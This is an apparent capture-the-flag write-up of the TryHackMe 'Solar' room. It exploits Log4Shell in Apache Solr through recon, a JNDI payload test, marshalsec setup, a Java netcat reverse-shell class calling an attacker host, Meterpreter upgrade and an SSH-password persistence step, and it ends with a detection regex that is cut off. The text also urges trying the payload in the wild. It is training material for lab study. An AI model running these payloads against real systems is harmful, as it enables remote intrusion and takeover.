| .-. <span style=color:#ae81ff>\|</span> <span style=color:#f92672>{</span>_<span style=color:#f92672>}</span> |.-._<span style=color:#f92672>}</span> <span style=color:#f92672>}</span> | |  .-._<span style=color:#f92672>}</span> <span style=color:#f92672>}</span><span style=color:#ae81ff>\ </span>    <span style=color:#f92672>}</span>/  /<span style=color:#ae81ff>\ </span> <span style=color:#ae81ff>\|</span> |<span style=color:#ae81ff>\ </span> |                                                                                                                                                                                      
<span style=color:#e6db74>`</span>-<span style=color:#e6db74>&#39; `-&#39;</span><span style=color:#e6db74>`</span>-----<span style=color:#e6db74>&#39;`----&#39;</span>  <span style=color:#e6db74>`</span>-<span style=color:#e6db74>&#39;  `----&#39;</span>  <span style=color:#e6db74>`</span>---<span style=color:#e6db74>&#39; `-&#39;</span>  <span style=color:#e6db74>`</span>-<span style=color:#e6db74>&#39;`-&#39;</span> <span style=color:#e6db74>`</span>-<span style=color:#e6db74>&#39;                                                                                                                                                                                      
</span><span style=color:#e6db74>The Modern Day Port Scanner.                                                                                                                                                                                                                  
</span><span style=color:#e6db74>________________________________________                                                                                                                                                                                                      
</span><span style=color:#e6db74>: https://discord.gg/GFrQsGy           :                                                                                                                                                                                                      
</span><span style=color:#e6db74>: https://github.com/RustScan/RustScan :                                                                                                                                                                                                      
</span><span style=color:#e6db74> --------------------------------------                                                                                                                                                                                                       
</span><span style=color:#e6db74>üòµ https://admin.tryhackme.com                                                                                                                                                                                                                
</span><span style=color:#e6db74>                                                                                                                                                                                                                                              
</span><span style=color:#e6db74>[~] The config file is expected to be at &#34;/home/kali/.rustscan.toml&#34;                                                                                                                                                                          
</span><span style=color:#e6db74>[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers                                                                                                                           
</span><span style=color:#e6db74>[!] Your file limit is very small, which negatively impacts RustScan&#39;</span>s speed. Use the Docker image, or up the Ulimit with <span style=color:#e6db74>&#39;--ulimit 5000&#39;</span>.                                                                                                    
Open 10.10.145.200:22                                                                                                                                                                                                                         
Open 10.10.145.200:111                                                                                                                                                                                                                        
Open 10.10.145.200:8983                                                                                                                                                                                                                       
<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Starting Script<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>                                                                                                                                                                                                                        
<span style=color:#f92672>[</span>&gt;<span style=color:#f92672>]</span> Script to be run Some<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;nmap -vvv -p {{port}} {{ip}}&#34;</span><span style=color:#f92672>)</span>                                                                                                                                                                                     
                                                                                                                                                                                                                                              
<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-01-05 21:27 EST                                                                                                                                                                           
Initiating Ping Scan at 21:27                                                                                                                                                                                                                 
Scanning 10.10.145.200 <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>                                                                                                                                                                                                              
Completed Ping Scan at 21:27, 0.39s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>                                                                                                                                                                                   
Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:27                                                                                                                                                                                        
Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 21:27, 0.01s elapsed                                                                                                                                                                          
DNS resolution of <span style=color:#ae81ff>1</span> IPs took 0.01s. Mode: Async <span style=color:#f92672>[</span><span style=color:#75715e>#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]                                                                                                                                              </span>
Initiating Connect Scan at 21:27                                                                                                                                                                                                              
Scanning 10.10.145.200 <span style=color:#f92672>[</span><span style=color:#ae81ff>3</span> ports<span style=color:#f92672>]</span>                                                                                                                                                                                                              
Discovered open port 22/tcp on 10.10.145.200                                                                                                                                                                                                  
Discovered open port 111/tcp on 10.10.145.200                                                                                                                                                                                                 
Discovered open port 8983/tcp on 10.10.145.200                                                                                                                                                                                                
Completed Connect Scan at 21:27, 0.39s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>3</span> total ports<span style=color:#f92672>)</span>
</code></pre></div><p>Looks like only those 3 ports are currently opening. Here&rsquo;s the result of the last port scan:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ nmap -sV -p <span style=color:#ae81ff>8983</span> 10.10.145.200                                                                              <span style=color:#ae81ff>130</span> ‚®Ø
Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-01-05 21:29 EST
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.145.200
Host is up <span style=color:#f92672>(</span>0.39s latency<span style=color:#f92672>)</span>.

PORT     STATE SERVICE VERSION
8983/tcp open  http    Apache Solr

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 16.96 seconds
</code></pre></div><h2 id=discovery>Discovery<a hidden class=anchor aria-hidden=true href=#discovery>#</a></h2>
<p>Navigating to the application, we see this interface:</p>
<p><img loading=lazy src=/img/solarlog4j/soir-admin.png#center alt>
</p>
<p>The task also generously provided us a sample Solr log file. You can download it here: <a href=/data/solarlog4j/solrlogs.zip>solrlogs.zip</a>.</p>
<p>Most of those files just contain the default Solr banner, but <code>solr.log</code> contains something weird:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>...
2021-12-13 03:48:53.988 INFO  <span style=color:#f92672>(</span>qtp1083962448-18<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>   <span style=color:#f92672>]</span> o.a.s.s.HttpSolrCall <span style=color:#f92672>[</span>admin<span style=color:#f92672>]</span> webapp<span style=color:#f92672>=</span>null path<span style=color:#f92672>=</span>/admin/cores params<span style=color:#f92672>={}</span> status<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> QTime<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
2021-12-13 03:48:54.383 INFO  <span style=color:#f92672>(</span>qtp1083962448-17<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>   <span style=color:#f92672>]</span> o.a.s.s.HttpSolrCall <span style=color:#f92672>[</span>admin<span style=color:#f92672>]</span> webapp<span style=color:#f92672>=</span>null path<span style=color:#f92672>=</span>/admin/cores params<span style=color:#f92672>={}</span> status<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> QTime<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
2021-12-13 03:48:54.801 INFO  <span style=color:#f92672>(</span>qtp1083962448-23<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>   <span style=color:#f92672>]</span> o.a.s.s.HttpSolrCall <span style=color:#f92672>[</span>admin<span style=color:#f92672>]</span> webapp<span style=color:#f92672>=</span>null path<span style=color:#f92672>=</span>/admin/cores params<span style=color:#f92672>={}</span> status<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> QTime<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
2021-12-13 03:48:55.144 INFO  <span style=color:#f92672>(</span>qtp1083962448-21<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>   <span style=color:#f92672>]</span> o.a.s.s.HttpSolrCall <span style=color:#f92672>[</span>admin<span style=color:#f92672>]</span> webapp<span style=color:#f92672>=</span>null path<span style=color:#f92672>=</span>/admin/cores params<span style=color:#f92672>={}</span> status<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> QTime<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
2021-12-13 04:01:46.718 INFO  <span style=color:#f92672>(</span>qtp1083962448-18<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>   <span style=color:#f92672>]</span> o.a.s.s.HttpSolrCall <span style=color:#f92672>[</span>admin<span style=color:#f92672>]</span> webapp<span style=color:#f92672>=</span>null path<span style=color:#f92672>=</span>/admin/cores params<span style=color:#f92672>={</span>id<span style=color:#f92672>=</span>1337<span style=color:#f92672>}</span> status<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> QTime<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
2021-12-13 04:01:48.672 INFO  <span style=color:#f92672>(</span>qtp1083962448-16<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>   <span style=color:#f92672>]</span> o.a.s.s.HttpSolrCall <span style=color:#f92672>[</span>admin<span style=color:#f92672>]</span> webapp<span style=color:#f92672>=</span>null path<span style=color:#f92672>=</span>/admin/cores params<span style=color:#f92672>={</span>id<span style=color:#f92672>=</span>1337<span style=color:#f92672>}</span> status<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> QTime<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
2021-12-13 04:01:49.304 INFO  <span style=color:#f92672>(</span>qtp1083962448-20<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>   <span style=color:#f92672>]</span> o.a.s.s.HttpSolrCall <span style=color:#f92672>[</span>admin<span style=color:#f92672>]</span> webapp<span style=color:#f92672>=</span>null path<span style=color:#f92672>=</span>/admin/cores params<span style=color:#f92672>={</span>id<span style=color:#f92672>=</span>1337<span style=color:#f92672>}</span> status<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> QTime<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
2021-12-13 04:01:50.401 INFO  <span style=color:#f92672>(</span>qtp1083962448-20<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>   <span style=color:#f92672>]</span> o.a.s.s.HttpSolrCall <span style=color:#f92672>[</span>admin<span style=color:#f92672>]</span> webapp<span style=color:#f92672>=</span>null path<span style=color:#f92672>=</span>/admin/cores params<span style=color:#f92672>={</span>id<span style=color:#f92672>=</span>1337<span style=color:#f92672>}</span> status<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> QTime<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
2021-12-13 04:01:53.944 INFO  <span style=color:#f92672>(</span>qtp1083962448-20<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>   <span style=color:#f92672>]</span> o.a.s.s.HttpSolrCall <span style=color:#f92672>[</span>admin<span style=color:#f92672>]</span> webapp<span style=color:#f92672>=</span>null path<span style=color:#f92672>=</span>/admin/cores params<span style=color:#f92672>={}</span> status<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> QTime<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
...
</code></pre></div><p>There&rsquo;s an abnormal number of INFO level log entries. They repeatedly request for <code>/admin/cores</code> endpoint, and some contains unique <code>id</code> field in <code>params</code> entrypoint. Here&rsquo;s the result if you try to interact with it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl http://10.10.145.200:8983/solr/admin/cores
<span style=color:#f92672>{</span>
  <span style=color:#e6db74>&#34;responseHeader&#34;</span>:<span style=color:#f92672>{</span>
    <span style=color:#e6db74>&#34;status&#34;</span>:0,
    <span style=color:#e6db74>&#34;QTime&#34;</span>:0<span style=color:#f92672>}</span>,
  <span style=color:#e6db74>&#34;initFailures&#34;</span>:<span style=color:#f92672>{}</span>,
  <span style=color:#e6db74>&#34;status&#34;</span>:<span style=color:#f92672>{}}</span>
</code></pre></div><p>And a few more times:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -X POST http://10.10.145.200:8983/solr/admin/cores
<span style=color:#f92672>{</span>
  <span style=color:#e6db74>&#34;responseHeader&#34;</span>:<span style=color:#f92672>{</span>
    <span style=color:#e6db74>&#34;status&#34;</span>:0,
    <span style=color:#e6db74>&#34;QTime&#34;</span>:0<span style=color:#f92672>}</span>,
  <span style=color:#e6db74>&#34;initFailures&#34;</span>:<span style=color:#f92672>{}</span>,
  <span style=color:#e6db74>&#34;status&#34;</span>:<span style=color:#f92672>{}}</span>
                                                                                                                      
$ curl -X POST -d <span style=color:#e6db74>&#34;id=1337&#34;</span> http://10.10.145.200:8983/solr/admin/cores
<span style=color:#f92672>{</span>
  <span style=color:#e6db74>&#34;responseHeader&#34;</span>:<span style=color:#f92672>{</span>
    <span style=color:#e6db74>&#34;status&#34;</span>:0,
    <span style=color:#e6db74>&#34;QTime&#34;</span>:3<span style=color:#f92672>}</span>,
  <span style=color:#e6db74>&#34;initFailures&#34;</span>:<span style=color:#f92672>{}</span>,
  <span style=color:#e6db74>&#34;status&#34;</span>:<span style=color:#f92672>{}}</span>
</code></pre></div><p>We can see a slight change in the response: <code>QTime</code> changed, which probably means our posted data was recorded, or &ldquo;logged&rdquo;. Now it&rsquo;s time to check if this machine is vulnerable to <code>log4j</code>.</p>
<h2 id=proof-of-concept>Proof of concept<a hidden class=anchor aria-hidden=true href=#proof-of-concept>#</a></h2>
<p>As you may have known, the payload that set the Internet on fire is as simple as:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#e6db74>${</span>jndi:ldap://EVIL_HOST_ADDRESS<span style=color:#e6db74>}</span>
</code></pre></div><p>Find your address by <code>ip a</code>, open a <code>netcat</code> listener, then send your payload:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl -X POST -d <span style=color:#e6db74>&#39;${jndi:ldap://10.4.35.200:9999}&#39;</span> http://10.10.145.200:8983/solr/admin/cores
<span style=color:#f92672>{</span>
  <span style=color:#e6db74>&#34;responseHeader&#34;</span>:<span style=color:#f92672>{</span>
    <span style=color:#e6db74>&#34;status&#34;</span>:0,
    <span style=color:#e6db74>&#34;QTime&#34;</span>:0<span style=color:#f92672>}</span>,
  <span style=color:#e6db74>&#34;initFailures&#34;</span>:<span style=color:#f92672>{}</span>,
  <span style=color:#e6db74>&#34;status&#34;</span>:<span style=color:#f92672>{}}</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ nc -lvnp <span style=color:#ae81ff>9999</span>
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>9999</span> ...
connect to <span style=color:#f92672>[</span>10.4.35.200<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.145.200<span style=color:#f92672>]</span> <span style=color:#ae81ff>36400</span>
</code></pre></div><p>As you can see, the server readily sent back a request - it&rsquo;s confirmed being vulnerable to <code>log4j</code>! With this simple procedure you can now go exploit <code>log4j</code> in the wild, just put the payload in whatever you can think of - username, User Agent, request parameters, &mldr;, finger cross and hopefully <a href=https://portswigger.net/daily-swig/bug-bounty-platforms-handling-thousands-of-log4j-vulnerability-reports>a thousand-dollar bug bounty</a> will fall upon you. :D</p>
<h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2>
<p>This step called for some set up and installation, so it&rsquo;s better to power off our attacking machine and take a snapshot first.</p>
<p>If you&rsquo;re already in an &ldquo;attacking environment&rdquo;, like ParrotSec or Kali Linux, chances are required dependencies are already installed. You can run the commands below to automate the installing process.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>
cd /tmp

sudo apt install default-jdk git maven
git clone https://github.com/mbechler/marshalsec
cd marshalsec

mvn clean package -DskipTests
</code></pre></div><p>Then, create a simple Java reverse shell through <code>netcat</code> like this:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Exploit</span> <span style=color:#f92672>{</span>
    <span style=color:#f92672>/</span>img<span style=color:#f92672>/</span>solarlog4j <span style=color:#f92672>{</span>
        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
            java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Runtime</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&#34;</span><span style=color:#f92672>);</span>
        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
            e<span style=color:#f92672>.</span><span style=color:#a6e22e>printStackTrace</span><span style=color:#f92672>();</span>
        <span style=color:#f92672>}</span>
    <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>And then, spin up a LDAP server, a simple HTTP server, build the exploit, and open a <code>netcat</code> listener to wait for it.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span style=color:#e6db74>&#34;http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit&#34;</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 -m http.server
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>javac Exploit.java -source <span style=color:#ae81ff>8</span> -target <span style=color:#ae81ff>8</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nc -lnvp <span style=color:#ae81ff>9999</span>
</code></pre></div><p>With all that set up, the last task is to send our exploit.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl -X POST -d <span style=color:#e6db74>&#39;${jndi:ldap://10.4.35.200:1389/Exploit}&#39;</span> http://10.10.132.117:8983/solr/admin/cores
</code></pre></div><p>And&mldr; we got a reverse shell :D</p>
<div>
<div style=text-align:center><iframe id=ytplayer type=text/html width=640 height=360 src="https://www.youtube.com/embed/tihzRFqgxRk?autoplay=1?origin=https://git-akihakune.github.io" frameborder=0 allowfullscreen></iframe></div>
</div>
<p>If you want to go &ldquo;further and beyond&rdquo;, there&rsquo;s a small optional challenge:
<img loading=lazy src=/img/solarlog4j/extra-meterpreter.png#center alt>
</p>
<p>Challenge&mldr; accepted. :D</p>
<p>I recommend <a href=https://null-byte.wonderhowto.com/how-to/elevate-netcat-shell-meterpreter-session-for-more-power-control-0193211/>this tutorial</a>. Straight to the point, if you want to get a <code>meterpreter</code> instead of an usual unstable reverse shell, just catch it with Metasploit <code>multi/handler</code> and directly upgrade it.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; exploit                                                                                                                                                                                                         
                                                                                                                                                                                                                                              
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.4.35.200:9999                                                                                                                                                                                           
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command shell session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>10.4.35.200:9999 -&gt; 10.10.178.136:60342 <span style=color:#f92672>)</span> at 2022-01-06 05:53:05 -0500                                                                                                                                    
                                                                                                                                                                                                                                              
^Z                                                                                                                                                                                                                                            
Background session 1? <span style=color:#f92672>[</span>y/N<span style=color:#f92672>]</span>  y                                                                                                                                                                                                                
msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; sessions                                                                                                                                                                                                        
                                                                                                                                                                                                                                              
Active sessions                                                                                                                                                                                                                               
<span style=color:#f92672>===============</span>                                                                                                                                                                                                                               
                                                                                                                                                                                                                                              
  Id  Name  Type             Information  Connection                                                                                                                                                                                          
  --  ----  ----             -----------  ----------                                                                                                                                                                                          
  <span style=color:#ae81ff>1</span>         shell sparc/bsd               10.4.35.200:9999 -&gt; 10.10.178.136:60342  <span style=color:#f92672>(</span>10.10.178.136<span style=color:#f92672>)</span>                                                                                                                                            
                                                                                                                                                                                                                                              
msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; sessions -u <span style=color:#ae81ff>1</span>                                                                                                                                                                                                   
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Executing <span style=color:#e6db74>&#39;post/multi/manage/shell_to_meterpreter&#39;</span> on session<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>: <span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>                                                                                                                                                                     
                                                                                                                                                                                                                                              
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Upgrading session ID: <span style=color:#ae81ff>1</span>                                                                                                                                                                                                                   
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting exploit/multi/handler                                                                                                                                                                                                            
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.4.35.200:4433                                                                                                                                                                                           
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command stager progress: 100.00% <span style=color:#f92672>(</span>773/773 bytes<span style=color:#f92672>)</span>                                                                                                                                                                                          
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>984904</span> bytes<span style=color:#f92672>)</span> to 10.10.178.136                                                                                                                                                                                             
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>2</span> opened <span style=color:#f92672>(</span>10.4.35.200:4433 -&gt; 10.10.178.136:38424 <span style=color:#f92672>)</span> at 2022-01-06 05:54:23 -0500                                                                                                                                      
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stopping exploit/multi/handler

msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; sessions -i <span style=color:#ae81ff>2</span>                                                                                                                                                                                                   
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 2...                                                                                                                                                                                                            
                                                                                                                                                                                                                                              
meterpreter &gt;
</code></pre></div><h2 id=persistence>Persistence<a hidden class=anchor aria-hidden=true href=#persistence>#</a></h2>
<p>As you may have noticed from the video above, this <code>solr</code> user can run <code>sudo</code> without password.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>meterpreter &gt; shell
Process <span style=color:#ae81ff>1794</span> created.
Channel <span style=color:#ae81ff>2</span> created.
sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> solr on solar:
    env_reset, exempt_group<span style=color:#f92672>=</span>sudo, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin

User solr may run the following commands on solar:
    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: ALL
</code></pre></div><p>This saved us from the hassle of dropping a backdoor ourselves. Now, let&rsquo;s change the SSH password and lordly SSH in like a boss. <code>„Éæ(‚åê‚ñ†_‚ñ†)„Éé‚ô™</code></p>
<h2 id=detection>Detection<a hidden class=anchor aria-hidden=true href=#detection>#</a></h2>
<p>This section is dedicated to sysadmins, but if you own an Internet-exposing server, you&rsquo;ll definitely want to check this <a href=https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/>useful massive Reddit thread</a> out.</p>
<p>Checking the affected log file again, we can see our payload proudly stood there:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>solr@solar:/var/solr/logs$ tail -n <span style=color:#ae81ff>1</span> solr.log
2022-01-06 10:52:55.930 INFO  <span style=color:#f92672>(</span>qtp1083962448-18<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>   <span style=color:#f92672>]</span> o.a.s.s.HttpSolrCall <span style=color:#f92672>[</span>admin<span style=color:#f92672>]</span> webapp<span style=color:#f92672>=</span>null path<span style=color:#f92672>=</span>/admin/cores params<span style=color:#f92672>={</span><span style=color:#e6db74>${</span>jndi:ldap://10.4.35.200:1389/Exploit<span style=color:#ae81ff>\}</span>=<span style=color:#e6db74>}</span> status<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> QTime<span style=color:#f92672>=</span><span style=color:#ae81ff>2399</span>
</code></pre></div><p>And here&rsquo;s <a href=https://github.com/back2root/log4shell-rex>the most beautiful but terrifying detection on the Internet</a>:</p>
<pre tabindex=0><code class=language-regex data-lang=regex>(?im)(?:^|[\n]).*?(?:[\x24]|%(?:25%?)*24|\\u?0*(?:44|24))(?:[\x7b]|%(?:25%?)*7b|\\u?0*(?:7b|173))[^\n]*?((?:j|%(?:25%?)*(?:4a|6a)|\\u?0*(?:112|6a|4a|152))[^\n]*?(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:[i\x{130}\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))[^\n]*?(?:[\x3a]|%(?:25%?)*3a|\\u?0*(?:72|3a))[^\n]*?((?:l|%(?:25%?)*(?:4c|6c)|\\u?0*(?:154|114|6c|4c))[^\n]*?(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:a|%(?:25%?)*(?:41|61)|\\u?0*(?:101|61|41|141))[^\n]*?(?:p|%(?:25%?)*(?:50|70)|\\u?0*(?:70|50|160|120))(?:[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163)))?|(?:r|%(?:25%?)*(?:52|72)|\\u?0*(?:122|72|52|162))[^\n]*?(?:m|%(?:25%?)*(?:4d|6d)|\\u?0*(?:4d|155|115|6d))[^\n]*?(?:[i\x{130}\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))|(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))|(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:[i\x{130}\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))|(?:[^\n]*?(?:[i\x{130}\x{131}]|%(?:25%?)*(?:49|69|C4%(?:25%?)*B0|C4%(?:25%?)*B1)|\\u?0*(?:111|69|49|151|130|460|131|461))){2}[^\n]*?(?:o|%(?:25%?)*(?:4f|6f)|\\u?0*(?:6f|4f|157|117))[^\n]*?(?:p|%(?:25%?)*(?:50|70)|\\u?0*(?:70|50|160|120))|(?:c|%(?:25%?)*(?:43|63)|\\u?0*(?:143|103|63|43))[^\n]*?(?:o|%(?:25%?)*(?:4f|6f)|\\u?0*(?:6f|4f|157|117))[^\n]*?(?:r|%(?:25%?)*(?:52|72)|\\u?0*(?:122|72|52|162))[^\n]*?(?:b|%(?:25%?)*(?:42|62)|\\u?0*(?:102|62|42|142))[^\n]*?(?:a|%(?:25%?)*(?:41|61)|\\u?0*(?:101|61|41|141))|(?:n|%(?:25%?)*(?:4e|6e)|\\u?0*(?:4e|156|116|6e))[^\n]*?(?:d|%(?:25%?)*(?:44|64)|\\u?0*(?:44|144|104|64))[^\n]*?(?:[s\x{17f}]|%(?:25%?)*(?:53|73|C5%(?:25%?)*BF)|\\u?0*(?:17f|123|577|73|53|163))|(?:h|%(?:25%?)*(?:48|68)|\\u?0*(?:110|68|48|150))(?:[^\n]*?(?:t|%(?:25%?)*(?:54|74)|\\u?0*(?:124|74|54|